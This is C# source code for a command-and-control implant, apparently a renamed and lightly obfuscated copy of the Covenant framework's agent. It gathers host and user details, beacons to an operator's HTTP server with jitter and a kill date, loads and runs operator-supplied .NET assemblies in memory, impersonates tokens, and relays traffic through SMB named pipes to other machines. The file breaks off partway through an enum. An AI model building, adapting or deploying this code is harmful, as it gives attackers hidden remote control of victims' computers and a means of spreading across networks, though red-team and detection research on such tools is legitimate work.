using System;
using System.Net;
using System.Linq;
using System.Text;
using System.IO;
using System.IO.Pipes;
using System.IO.Compression;
using System.Threading;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace echoCovEx
{
    class Ant
    {
        public static void Execute(string EchoURI, string EchoCertHash, string GUID, Aes SessK)
        {
            try
            {
                int slow = Convert.ToInt32(@"{{REPLACE_DELAY}}");
                int Dyno = Convert.ToInt32(@"{{REPLACE_JITTER_PERCENT}}");
                int ConAttp = Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
                DateTime StopDt = DateTime.FromBinary(long.Parse(@"{{REPLACE_KILL_DATE}}"));
                List<string> EchoHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                List<string> EchoHeaderVals = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                List<string> EchoHTTPUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
                string EchoProGetResp = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}".Replace(Environment.NewLine, "\n");
                string EchoProPOSTReq = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
                string EchoProPOSTResp = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
                bool ValCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
                bool UsePin = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");

                string Basename = Dns.GetHostName();
                string IAddr = Dns.GetHostAddresses(Basename)[0].ToString();
                foreach (IPAddress a in Dns.GetHostAddresses(Dns.GetHostName()))
                {
                    if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        IAddr = a.ToString();
                        break;
                    }
                }
                string OpSys = Environment.OSVersion.ToString();
                string CProc = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
                int Gritty = 2;
                if (Environment.UserName.ToLower() == "system")
                {
                    Gritty = 4;
                }
                else
                {
                    var idty = WindowsIdentity.GetCurrent();
                    if (idty.Owner != idty.User)
                    {
                        Gritty = 3;
                    }
                }
                string UDomName = Environment.UserDomainName;
                string UName = Environment.UserName;

                string RegBod = @"{ ""integrity"": " + Gritty + @", ""process"": """ + CProc + @""", ""userDomainName"": """ + UDomName + @""", ""userName"": """ + UName + @""", ""delay"": " + Convert.ToString(slow) + @", ""jitter"": " + Convert.ToString(Dyno) + @", ""connectAttempts"": " + Convert.ToString(ConAttp) + @", ""status"": 0, ""ipAddress"": """ + IAddr + @""", ""hostname"": """ + Basename + @""", ""operatingSystem"": """ + OpSys + @""" }";
                IMessenger bMess = null;
                bMess = new HtpMessgr(EchoURI, EchoCertHash, UsePin, ValCert, EchoHeaderNames, EchoHeaderVals, EchoHTTPUrls);
                bMess.Read();
                bMess.Identifier = GUID;
                TskMessgr mess = new TskMessgr
                (
                    new MessCrftr(GUID, SessK),
                    bMess,
                    new Profl(EchoProGetResp, EchoProPOSTReq, EchoProPOSTResp)
                );
                mess.QTskMess(RegBod);
                mess.WTskMess();
                mess.SetAuthenticator(mess.ReadTaskingMessage().Message);
                try
                {
                    // A blank upward write, this helps in some cases with an HTTP Proxy
                    mess.QTskMess("");
                    mess.WTskMess();
                }
                catch (Exception) { }

                List<KeyValuePair<string, Thread>> Tsks = new List<KeyValuePair<string, Thread>>();
                WindowsImpersonationContext impContext = null;
                Random rnd = new Random();
                int ConAttpCnt = 0;
                bool aliver = true;
                while (aliver)
                {
                    int cswitch = rnd.Next((int)Math.Round(slow * (Dyno / 100.00)));
                    if (rnd.Next(2) == 0) { cswitch = -cswitch; }
                    Thread.Sleep((slow + cswitch) * 1000);
                    try
                    {
                        AntTskMess amess = mess.ReadTaskingMessage();
                        if (amess != null)
                        {
                            ConAttpCnt = 0;
                            string myout = "";
                            if (amess.Type == AntTskType.SetDelay || amess.Type == AntTskType.SetJitter || amess.Type == AntTskType.SetConnectAttempts)
                            {
                                if (int.TryParse(amess.Message, out int val))
                                {
                                    if (amess.Type == AntTskType.SetDelay)
                                    {
                                        slow = val;
                                        myout += "Set slow: " + slow;
                                    }
                                    else if (amess.Type == AntTskType.SetJitter)
                                    {
                                        Dyno = val;
                                        myout += "Set Dyno: " + Dyno;
                                    }
                                    else if (amess.Type == AntTskType.SetConnectAttempts)
                                    {
                                        ConAttp = val;
                                        myout += "Set ConAttp: " + ConAttp;
                                    }
                                }
                                else
                                {
                                    myout += "Error parsing: " + amess.Message;
                                }
                                mess.QTskMess(new AntTskMessResp(AntTskStat.Completed, myout).ToJson(), amess.Name);
                            }
                            else if (amess.Type == AntTskType.SetKillDate)
                            {
                                if (DateTime.TryParse(amess.Message, out DateTime date))
                                {
                                    StopDt = date;
                                    myout += "Set StopDt: " + StopDt.ToString();
                                }
                                else
                                {
                                    myout += "Error parsing: " + amess.Message;
                                }
                                mess.QTskMess(new AntTskMessResp(AntTskStat.Completed, myout).ToJson(), amess.Name);
                            }
                            else if (amess.Type == AntTskType.Exit)
                            {
                                myout += "Exited";
                                mess.QTskMess(new AntTskMessResp(AntTskStat.Completed, myout).ToJson(), amess.Name);
                                mess.WTskMess();
                                return;
                            }
                            else if (amess.Type == AntTskType.Tasks)
                            {
                                if (!Tsks.Where(T => T.Value.IsAlive).Any()) { myout += "No active tasks!"; }
                                else
                                {
                                    myout += "Task       Status" + Environment.NewLine;
                                    myout += "-++-       -++++-" + Environment.NewLine;
                                    myout += String.Join(Environment.NewLine, Tsks.Where(T => T.Value.IsAlive).Select(T => T.Key + " Active").ToArray());
                                }
                                mess.QTskMess(new AntTskMessResp(AntTskStat.Completed, myout).ToJson(), amess.Name);
                            }
                            else if (amess.Type == AntTskType.TaskKill)
                            {
                                var matched = Tsks.Where(T => T.Value.IsAlive && T.Key.ToLower() == amess.Message.ToLower());
                                if (!matched.Any())
                                {
                                    myout += "No active task with name: " + amess.Message;
                                }
                                else
                                {
                                    KeyValuePair<string, Thread> t = matched.First();
                                    t.Value.Abort();
                                    Thread.Sleep(3000);
                                    if (t.Value.IsAlive)
                                    {
                                        t.Value.Suspend();
                                    }
                                    myout += "Task: " + t.Key + " killed!";
                                }
                                mess.QTskMess(new AntTskMessResp(AntTskStat.Completed, myout).ToJson(), amess.Name);
                            }
                            else if (amess.Token)
                            {
                                if (impContext != null)
                                {
                                    impContext.Undo();
                                }
                                IntPtr impTok = IntPtr.Zero;
                                Thread t = new Thread(() =>
                                {
                                    try
                                    {
                                        impTok = TskExe(mess, amess, slow);
                                    }
                                    catch { }
                                });
                                t.Start();
                                Tsks.Add(new KeyValuePair<string, Thread>(amess.Name, t));
                                bool completed = t.Join(5000);
                                if (completed && impTok != IntPtr.Zero)
                                {
                                    try
                                    {
                                        WindowsIdentity identity = new WindowsIdentity(impTok);
                                        impContext = identity.Impersonate();
                                    }
                                    catch (ArgumentException) { }
                                }
                                else
                                {
                                    impContext = null;
                                }
                            }
                            else
                            {
                                Thread t = new Thread(() =>
                                {
                                    try
                                    {
                                        TskExe(mess, amess, slow);
                                    }
                                    catch { }
                                });
                                t.Start();
                                Tsks.Add(new KeyValuePair<string, Thread>(amess.Name, t));
                            }
                        }
                        mess.WTskMess();
                    }
                    catch (ObjectDisposedException e)
                    {
                        ConAttpCnt++;
                        mess.QTskMess(new AntTskMessResp(AntTskStat.Completed, "").ToJson());
                        mess.WTskMess();
                    }
                    catch (Exception e)
                    {
                        ConAttpCnt++;
                        Console.Error.WriteLine("Loop Exception: " + e.GetType().ToString() + " " + e.Message + Environment.NewLine + e.StackTrace);
                    }
                    if (ConAttpCnt >= ConAttp) { return; }
                    if (StopDt.CompareTo(DateTime.Now) < 0) { return; }
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Outer Exception: " + e.Message + Environment.NewLine + e.StackTrace);
            }
        }

        private static IntPtr TskExe(TskMessgr messgr, AntTskMess mess, int Delay)
        {
            const int MAX_MESS_SZ = 1048576;
            string mout = "";
            try
            {
                if (mess.Type == AntTskType.Assembly)
                {
                    string[] pieces = mess.Message.Split(',');
                    if (pieces.Length > 0)
                    {
                        object[] parms = null;
                        if (pieces.Length > 1) { parms = new object[pieces.Length - 1]; }
                        for (int i = 1; i < pieces.Length; i++) { parms[i - 1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }
                        byte[] comBy = Convert.FromBase64String(pieces[0]);
                        byte[] decomBy = Utilities.Decompress(comBy);
                        Assembly antTsk = Assembly.Load(decomBy);
                        PropertyInfo strProp = antTsk.GetType("Task").GetProperty("OutputStream");
                        string results = "";
                        if (strProp == null)
                        {
                            results = (string)antTsk.GetType("Task").GetMethod("Execute").Invoke(null, parms);
                        }
                        else
                        {
                            Thread iThrd = new Thread(() => results = (string)antTsk.GetType("Task").GetMethod("Execute").Invoke(null, parms));
                            using (AnonymousPipeServerStream pipSrv = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
                            {
                                using (AnonymousPipeClientStream pipCli = new AnonymousPipeClientStream(PipeDirection.Out, pipSrv.GetClientHandleAsString()))
                                {
                                    strProp.SetValue(null, pipCli, null);
                                    DateTime lastTime = DateTime.Now;
                                    iThrd.Start();
                                    using (StreamReader rdr = new StreamReader(pipSrv))
                                    {
                                        object sclok = new object();
                                        string cRead = "";
                                        Thread rThrd = new Thread(() => {
                                            int count;
                                            char[] read = new char[MAX_MESS_SZ];
                                            while ((count = rdr.Read(read, 0, read.Length)) > 0)
                                            {
                                                lock (sclok)
                                                {
                                                    cRead += new string(read, 0, count);
                                                }
                                            }
                                        });
                                        rThrd.Start();
                                        while (rThrd.IsAlive)
                                        {
                                            Thread.Sleep(Delay * 1000);
                                            lock (sclok)
                                            {
                                                try
                                                {
                                                    if (cRead.Length >= MAX_MESS_SZ)
                                                    {
                                                        for (int i = 0; i < cRead.Length; i += MAX_MESS_SZ)
                                                        {
                                                            string aRead = cRead.Substring(i, Math.Min(MAX_MESS_SZ, cRead.Length - i));
                                                            try
                                                            {
                                                                AntTskMessResp response = new AntTskMessResp(AntTskStat.Progressed, aRead);
                                                                messgr.QTskMess(response.ToJson(), mess.Name);
                                                            }
                                                            catch (Exception) { }
                                                        }
                                                        cRead = "";
                                                        lastTime = DateTime.Now;
                                                    }
                                                    else if (cRead.Length > 0 && DateTime.Now > (lastTime.Add(TimeSpan.FromSeconds(Delay))))
                                                    {
                                                        AntTskMessResp response = new AntTskMessResp(AntTskStat.Progressed, cRead);
                                                        messgr.QTskMess(response.ToJson(), mess.Name);
                                                        cRead = "";
                                                        lastTime = DateTime.Now;
                                                    }
                                                }
                                                catch (ThreadAbortException) { break; }
                                                catch (Exception) { cRead = ""; }
                                            }
                                        }
                                        mout += cRead;
                                    }
                                }
                            }
                            iThrd.Join();
                        }
                        mout += results;
                    }
                }
                else if (mess.Type == AntTskType.Connect)
                {
                    string[] split = mess.Message.Split(',');
                    bool connected = messgr.Connect(split[0], split[1]);
                    mout += connected ? "Connection to " + split[0] + ":" + split[1] + " succeeded!" :
                                          "Connection to " + split[0] + ":" + split[1] + " failed.";
                }
                else if (mess.Type == AntTskType.Disconnect)
                {
                    bool disconnected = messgr.Disconnect(mess.Message);
                    mout += disconnected ? "Disconnect succeeded!" : "Disconnect failed.";
                }
            }
            catch (Exception e)
            {
                try
                {
                    AntTskMessResp response = new AntTskMessResp(AntTskStat.Completed, "Task Exception: " + e.Message + Environment.NewLine + e.StackTrace);
                    messgr.QTskMess(response.ToJson(), mess.Name);
                }
                catch (Exception) { }
            }
            finally
            {
                for (int i = 0; i < mout.Length; i += MAX_MESS_SZ)
                {
                    string aRead = mout.Substring(i, Math.Min(MAX_MESS_SZ, mout.Length - i));
                    try
                    {
                        AntTskStat status = i + MAX_MESS_SZ < mout.Length ? AntTskStat.Progressed : AntTskStat.Completed;
                        AntTskMessResp response = new AntTskMessResp(status, aRead);
                        messgr.QTskMess(response.ToJson(), mess.Name);
                    }
                    catch (Exception) { }
                }
                if (string.IsNullOrEmpty(mout))
                {
                    AntTskMessResp response = new AntTskMessResp(AntTskStat.Completed, "");
                    messgr.QTskMess(response.ToJson(), mess.Name);
                }
            }
            return WindowsIdentity.GetCurrent().Token;
        }
    }

    public enum MessageType
    {
        Read,
        Write
    }

    public class ProMessg
    {
        public MessageType Type { get; set; }
        public string Message { get; set; }
    }

    public class MessageEventArgs : EventArgs
    {
        public string Message { get; set; }
    }

    public interface IMessenger
    {
        string Hostname { get; }
        string Identifier { get; set; }
        string Authenticator { get; set; }
        EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }
        ProMessg Read();
        void Write(string Message);
        void Close();
    }

    public class Profl
    {
        private string GetResponse { get; }
        private string PostRequest { get; }
        private string PostResponse { get; }

        public Profl(string GetResponse, string PostRequest, string PostResponse)
        {
            this.GetResponse = GetResponse;
            this.PostRequest = PostRequest;
            this.PostResponse = PostResponse;
        }

        public AntEncMess ParseGetResponse(string Message) { return Parse(this.GetResponse, Message); }
        public AntEncMess ParsePostRequest(string Message) { return Parse(this.PostRequest, Message); }
        public AntEncMess ParsePostResponse(string Message) { return Parse(this.PostResponse, Message); }
        public string FormatGetResponse(AntEncMess Message) { return Format(this.GetResponse, Message); }
        public string FormatPostRequest(AntEncMess Message) { return Format(this.PostRequest, Message); }
        public string FormatPostResponse(AntEncMess Message) { return Format(this.PostResponse, Message); }

        private static AntEncMess Parse(string Format, string Message)
        {
            string json = Common.AntEnc.GetString(Utilities.MessageTransform.Invert(
                Utilities.Parse(Message, Format)[0]
            ));
            if (json == null || json.Length < 3)
            {
                return null;
            }
            return AntEncMess.FromJson(json);
        }

        private static string Format(string Format, AntEncMess Message)
        {
            return String.Format(Format,
                Utilities.MessageTransform.Transform(Common.AntEnc.GetBytes(AntEncMess.ToJson(Message)))
            );
        }
    }

    public class TskMessgr
    {
        private object _UpstreamLock = new object();
        private IMessenger UpstreamMessenger { get; set; }
        private object _MessageQueueLock = new object();
        private Queue<string> MessageQueue { get; } = new Queue<string>();

        private MessCrftr Crafter { get; }
        private Profl Profile { get; }

        protected List<IMessenger> DownstreamMessengers { get; } = new List<IMessenger>();

        public TskMessgr(MessCrftr Crafter, IMessenger Messenger, Profl Profile)
        {
            this.Crafter = Crafter;
            this.UpstreamMessenger = Messenger;
            this.Profile = Profile;
            this.UpstreamMessenger.UpstreamEventHandler += (sender, e) => {
                this.QTskMess(e.Message);
                this.WTskMess();
            };
        }

        public AntTskMess ReadTaskingMessage()
        {
            ProMessg readMessage = null;
            lock (_UpstreamLock)
            {
                readMessage = this.UpstreamMessenger.Read();
            }
            if (readMessage == null)
            {
                return null;
            }
            AntEncMess AntMess = null;
            if (readMessage.Type == MessageType.Read)
            {
                AntMess = this.Profile.ParseGetResponse(readMessage.Message);
            }
            else if (readMessage.Type == MessageType.Write)
            {
                AntMess = this.Profile.ParsePostResponse(readMessage.Message);
            }
            if (AntMess == null)
            {
                return null;
            }
            else if (AntMess.Type == AntEncMess.GruntEncryptedMessageType.Tasking)
            {
                string json = this.Crafter.Retrieve(AntMess);
                return (json == null || json == "") ? null : AntTskMess.FromJson(json);
            }
            else
            {
                string json = this.Crafter.Retrieve(AntMess);
                AntEncMess wrpMess = AntEncMess.FromJson(json);
                IMessenger rlay = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier == wrpMess.GUID);
                if (rlay != null)
                {
                    rlay.Write(this.Profile.FormatGetResponse(wrpMess));
                }
                return null;
            }
        }

        public void QTskMess(string Message, string Meta = "")
        {
            AntEncMess antMess = this.Crafter.Create(Message, Meta);
            string uploaded = this.Profile.FormatPostRequest(antMess);
            lock (_MessageQueueLock)
            {
                this.MessageQueue.Enqueue(uploaded);
            }
        }

        public void WTskMess()
        {
            try
            {
                lock (_UpstreamLock)
                {
                    lock (_MessageQueueLock)
                    {
                        this.UpstreamMessenger.Write(this.MessageQueue.Dequeue());
                    }
                }
            }
            catch (InvalidOperationException) { }
        }

        public void SetAuthenticator(string Authenticator)
        {
            lock (this._UpstreamLock)
            {
                this.UpstreamMessenger.Authenticator = Authenticator;
            }
        }

        public bool Connect(string Hostname, string PipeName)
        {
            IMessenger olddstream = this.DownstreamMessengers.FirstOrDefault(DM => DM.Hostname.ToLower() == (Hostname + ":" + PipeName).ToLower());
            if (olddstream != null)
            {
                olddstream.Close();
                this.DownstreamMessengers.Remove(olddstream);
            }

            SmbMessgr dstrm = new SmbMessgr(Hostname, PipeName);
            Thread readThread = new Thread(() =>
            {
                while (dstrm.IsConnected)
                {
                    try
                    {
                        ProMessg read = dstrm.Read();
                        if (read != null && !string.IsNullOrEmpty(read.Message))
                        {
                            if (string.IsNullOrEmpty(dstrm.Identifier))
                            {
                                AntEncMess message = this.Profile.ParsePostRequest(read.Message);
                                if (message.GUID.Length == 20)
                                {
                                    dstrm.Identifier = message.GUID.Substring(10);
                                }
                                else if (message.GUID.Length == 10)
                                {
                                    dstrm.Identifier = message.GUID;
                                }
                            }
                            this.UpstreamMessenger.Write(read.Message);
                        }
                    }
                    catch (Exception e)
                    {
                        Console.Error.WriteLine("Thread Exception: " + e.Message + Environment.NewLine + e.StackTrace);
                    }
                }
                // Connection became disconnected and therefore we remove the dstrm object
                this.DownstreamMessengers.Remove(dstrm);
            });
            dstrm.ReadThread = readThread;
            dstrm.ReadThread.Start();
            this.DownstreamMessengers.Add(dstrm);
            return true;
        }

        public bool Disconnect(string Identifier)
        {
            IMessenger downstream = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier.ToLower() == Identifier.ToLower());
            if (downstream != null)
            {
                downstream.Close();
                this.DownstreamMessengers.Remove(downstream);
                return true;
            }
            return false;
        }
    }

    public class SmbMessgr : IMessenger
    {
        public string Hostname { get; } = string.Empty;
        public string Identifier { get; set; } = string.Empty;
        public string Authenticator { get; set; } = string.Empty;
        public EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }
        public Thread ReadThread { get; set; } = null;

        private string PipeName { get; } = null;
        // Thread that monitors the status of the named pipe and updates _IsConnected accordingly.
        private Thread MonitoringThread { get; set; } = null;
        // This flag syncs communication peers in case one of the them dies (see method Read and Write)
        private bool IsServer { get; set; }
        private int Timeout { get; set; } = 5000;

        private object _PipeLock = new object();
        private PipeStream _Pipe;
        private PipeStream Pipe
        {
            get { lock (this._PipeLock) { return this._Pipe; } }
            set { lock (this._PipeLock) { this._Pipe = value; } }
        }

        protected object _IsConnectedLock = new object();
        private bool _IsConnected;
        public bool IsConnected
        {
            get { lock (this._IsConnectedLock) { return this._IsConnected; } }
            set { lock (this._IsConnectedLock) { this._IsConnected = value; } }
        }

        public SmbMessgr(string Hostname, string Pipename)
        {
            this.Hostname = Hostname;
            this.PipeName = Pipename;
            this.IsServer = false;
            this.InitializePipe();
        }

        public SmbMessgr(PipeStream Pipe, string Pipename)
        {
            this.Pipe = Pipe;
            this.PipeName = Pipename;
            this.IsServer = true;
            if (Pipe != null && Pipe.IsConnected)
            {
                this.IsConnected = Pipe.IsConnected;
                this.MonitorPipeState();
            }
            this.InitializePipe();
        }

        public ProMessg Read()
        {
            ProMessg result = null;
            try
            {
                // If the Ant acts as SMB server, then after an interruption it shall wait in the read method until the connection 
                // is re-established.
                // This ensures that after the interruption, both communication peers return to their pre-defined state. If this is not
                // implemented, then both communication peers might return to the same state (e.g., read), which leads to a deadlock.
                if (this.IsServer)
                {
                    this.InitializePipe();
                }
                if (this.IsConnected)
                {
                    result = new ProMessg { Type = MessageType.Read, Message = Common.AntEnc.GetString(this.ReadBytes()) };
                }
            }
            // These are exceptions that could be raised, if the named pipe became (unexpectedly) closed. It is important to catch these 
            // exceptions here so that the calling method can continue until it calls Read or Write the next time and then, the they'll 
            // try to restablish the named pipe
            catch (IOException) { }
            catch (NullReferenceException) { }
            catch (ObjectDisposedException) { }
            return result;
        }

        public void Write(string Message)
        {
            try
            {
                // If the Ant acts as SMB client, then after an interruption it shall wait in the write method until the connection 
                // is re-established.
                // This ensures that after the interruption, both communication peers return to their pre-defined state. If this is not
                // implemented, then both communication peers might return to the same state (e.g., read), which leads to a deadlock.
                if (!this.IsServer)
                {
                    this.InitializePipe();
                }
                if (this.IsConnected)
                {
                    this.WriteBytes(Common.AntEnc.GetBytes(Message));
                }
            }
            // These are exceptions that could be raised, if the named pipe became (unexpectedly) closed. It is important to catch these 
            // exceptions here so that the calling method can continue until it calls Read or Write the next time and then, the they'll 
            // try to restablish the named pipe
            catch (IOException) { }
            catch (NullReferenceException) { }
            catch (ObjectDisposedException) { }
        }

        public void Close()
        {
            // Close named pipe and terminate MonitoringThread by setting IsConnected to false
            lock (this._PipeLock)
            {
                try
                {
                    if (this._Pipe != null)
                    {
                        this._Pipe.Close();
                    }
                }
                catch (Exception) { }
                this._Pipe = null;
                this.IsConnected = false;
            }
        }

        private void InitializePipe()
        {
            if (!this.IsConnected)
            {
                // If named pipe became disconnected (!this.IsConnected), then wait for a new incoming connection, else continue.
                if (this.IsServer)
                {
                    PipeSecurity ps = new PipeSecurity();
                    ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
                    NamedPipeServerStream newServerPipe = new NamedPipeServerStream(this.PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
                    newServerPipe.WaitForConnection();
                    this.Pipe = newServerPipe;
                    this.IsConnected = true;
                    this.MonitorPipeState();
                    // Tell the parent Ant the GUID so that it knows to which child grunt which messages shall be forwarded. Without this amess, any further communication breaks.
                    this.UpstreamEventHandler?.Invoke(this, new MessageEventArgs { Message = string.Empty });
                }
                // If named pipe became disconnected (!this.IsConnected), then try to re-connect to the SMB server, else continue.
                else
                {
                    NamedPipeClientStream ClientPipe = new NamedPipeClientStream(Hostname, PipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
                    ClientPipe.Connect(Timeout);
                    ClientPipe.ReadMode = PipeTransmissionMode.Byte;
                    this.Pipe = ClientPipe;
                    this.IsConnected = true;
                    // Start the pipe status monitoring thread
                    this.MonitorPipeState();
                }
            }
        }

        private void MonitorPipeState()
        {
            this.MonitoringThread = new Thread(() =>
            {
                while (this.IsConnected)
                {
                    try
                    {

                        Thread.Sleep(1000);
                        // We cannot use this.Pipe.IsConnected because this will result in a deadlock
                        this.IsConnected = this._Pipe.IsConnected;
                        if (!this.IsConnected)
                        {
                            this._Pipe.Close();
                            this._Pipe = null;
                        }
                    }
                    catch (Exception) { }
                }
            });
            this.MonitoringThread.IsBackground = true;
            this.MonitoringThread.Start();
        }

        private void WriteBytes(byte[] bytes)
        {
            byte[] compressed = Utilities.Compress(bytes);
            byte[] size = new byte[4];
            size[0] = (byte)(compressed.Length >> 24);
            size[1] = (byte)(compressed.Length >> 16);
            size[2] = (byte)(compressed.Length >> 8);
            size[3] = (byte)compressed.Length;
            this.Pipe.Write(size, 0, size.Length);
            var writtenBytes = 0;
            while (writtenBytes < compressed.Length)
            {
                int bytesToWrite = Math.Min(compressed.Length - writtenBytes, 1024);
                this.Pipe.Write(compressed, writtenBytes, bytesToWrite);
                writtenBytes += bytesToWrite;
            }
        }

        private byte[] ReadBytes()
        {
            byte[] size = new byte[4];
            int totalReadBytes = 0;
            int readBytes = 0;
            do
            {
                readBytes = this.Pipe.Read(size, 0, Math.Min(size.Length - totalReadBytes, size.Length));
                totalReadBytes += readBytes;
            } while (totalReadBytes < size.Length && readBytes != 0);
            int len = (size[0] << 24) + (size[1] << 16) + (size[2] << 8) + size[3];

            byte[] buffer = new byte[1024];
            using (var ms = new MemoryStream())
            {
                totalReadBytes = 0;
                readBytes = 0;
                do
                {
                    readBytes = this.Pipe.Read(buffer, 0, Math.Min(len - totalReadBytes, buffer.Length));
                    ms.Write(buffer, 0, readBytes);
                    totalReadBytes += readBytes;
                } while (totalReadBytes < len && readBytes != 0);
                return Utilities.Decompress(ms.ToArray());
            }
        }
    }

    public class HtpMessgr : IMessenger
    {
        public string Hostname { get; } = "";
        public string Identifier { get; set; } = "";
        public string Authenticator { get; set; } = "";
        public EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }

        private string CovenantURI { get; }
        private MyCWeCli CovenantClient { get; set; } = new MyCWeCli();
        private object _WebClientLock = new object();

        private Random Random { get; set; } = new Random();
        private List<string> ProfileHttpHeaderNames { get; }
        private List<string> ProfileHttpHeaderValues { get; }
        private List<string> ProfileHttpUrls { get; }

        private bool UseCertPinning { get; set; }
        private bool ValidateCert { get; set; }

        private Queue<ProMessg> ToReadQueue { get; } = new Queue<ProMessg>();

        public HtpMessgr(string CovenantURI, string CovenantCertHash, bool UseCertPinning, bool ValidateCert, List<string> ProfileHttpHeaderNames, List<string> ProfileHttpHeaderValues, List<string> ProfileHttpUrls)
        {
            this.CovenantURI = CovenantURI;
            this.Hostname = CovenantURI.Split(':')[1].Split('/')[2];
            this.ProfileHttpHeaderNames = ProfileHttpHeaderNames;
            this.ProfileHttpHeaderValues = ProfileHttpHeaderValues;
            this.ProfileHttpUrls = ProfileHttpUrls;

            this.CovenantClient.UseDefaultCredentials = true;
            this.CovenantClient.Proxy = WebRequest.DefaultWebProxy;
            this.CovenantClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

            this.UseCertPinning = UseCertPinning;
            this.ValidateCert = ValidateCert;

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
            try { ServicePointManager.SecurityProtocol = ServicePointManager.SecurityProtocol | SecurityProtocolType.Ssl3; } catch { }
            try { ServicePointManager.SecurityProtocol = ServicePointManager.SecurityProtocol | (SecurityProtocolType)768; } catch { }
            try { ServicePointManager.SecurityProtocol = ServicePointManager.SecurityProtocol | (SecurityProtocolType)3072; } catch { }
            try { ServicePointManager.SecurityProtocol = ServicePointManager.SecurityProtocol | (SecurityProtocolType)12288; } catch { }

            ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
            {
                bool valid = true;
                if (this.UseCertPinning && CovenantCertHash != "")
                {
                    valid = cert.GetCertHashString() == CovenantCertHash;
                }
                if (valid && this.ValidateCert)
                {
                    valid = errors == System.Net.Security.SslPolicyErrors.None;
                }
                return valid;
            };
        }

        public ProMessg Read()
        {
            if (this.ToReadQueue.Any())
            {
                return this.ToReadQueue.Dequeue();
            }
            lock (this._WebClientLock)
            {
                this.SetupCookieWebClient();
                return new ProMessg { Type = MessageType.Read, Message = this.CovenantClient.DownloadString(this.CovenantURI + this.GetURL()) };
            }
        }

        public void Write(string Message)
        {
            lock (this._WebClientLock)
            {
                this.SetupCookieWebClient();
                ProMessg ToReadMessage = new ProMessg { Type = MessageType.Write, Message = this.CovenantClient.UploadString(this.CovenantURI + this.GetURL(), Message) };
                if (ToReadMessage.Message != "")
                {
                    this.ToReadQueue.Enqueue(ToReadMessage);
                }
            }
        }

        public void Close() { }

        private string GetURL()
        {
            return this.ProfileHttpUrls[this.Random.Next(this.ProfileHttpUrls.Count)].Replace("{GUID}", this.Identifier);
        }

        private void SetupCookieWebClient()
        {
            for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
            {
                if (ProfileHttpHeaderNames[i] == "Cookie")
                {
                    this.CovenantClient.SetCookies(new Uri(this.CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", this.Identifier));
                }
                else
                {
                    this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", this.Identifier), ProfileHttpHeaderValues[i].Replace("{GUID}", this.Identifier));
                }
            }
        }
    }

    public class MessCrftr
    {
        private string GUID { get; }
        private Aes SessionKey { get; }

        public MessCrftr(string GUID, Aes SessionKey)
        {
            this.GUID = GUID;
            this.SessionKey = SessionKey;
        }

        public AntEncMess Create(string Message, string Meta = "")
        {
            return this.Create(Common.AntEnc.GetBytes(Message), Meta);
        }

        public AntEncMess Create(byte[] Message, string Meta = "")
        {
            byte[] encMessPak = Utilities.AesEncrypt(Message, this.SessionKey.Key);
            byte[] encIV = new byte[Common.AesIVLength];
            Buffer.BlockCopy(encMessPak, 0, encIV, 0, Common.AesIVLength);
            byte[] encMess = new byte[encMessPak.Length - Common.AesIVLength];
            Buffer.BlockCopy(encMessPak, Common.AesIVLength, encMess, 0, encMessPak.Length - Common.AesIVLength);

            byte[] hmac = Utilities.ComputeHMAC(encMess, SessionKey.Key);
            return new AntEncMess
            {
                GUID = this.GUID,
                Meta = Meta,
                EncryptedMessage = Convert.ToBase64String(encMess),
                IV = Convert.ToBase64String(encIV),
                HMAC = Convert.ToBase64String(hmac)
            };
        }

        public string Retrieve(AntEncMess message)
        {
            if (message == null || !message.VerifyHMAC(this.SessionKey.Key))
            {
                return null;
            }
            return Common.AntEnc.GetString(Utilities.AesDecrypt(message, SessionKey.Key));
        }
    }

    public class MyCWeCli : WebClient
    {
        private CookieContainer CookieContainer { get; }
        public MyCWeCli()
        {
            this.CookieContainer = new CookieContainer();
        }
        public void SetCookies(Uri uri, string cookies)
        {
            this.CookieContainer.SetCookies(uri, cookies);
        }
        protected override WebRequest GetWebRequest(Uri address)
        {
            var request = base.GetWebRequest(address) as HttpWebRequest;
            if (request == null) return base.GetWebRequest(address);
            request.CookieContainer = CookieContainer;
            return request;
        }
    }

    public enum AntTskType
    {
        Assembly,
        SetDelay,
        SetJitter,
        SetConnectAttempts,
        SetKillDate,
        Exit,
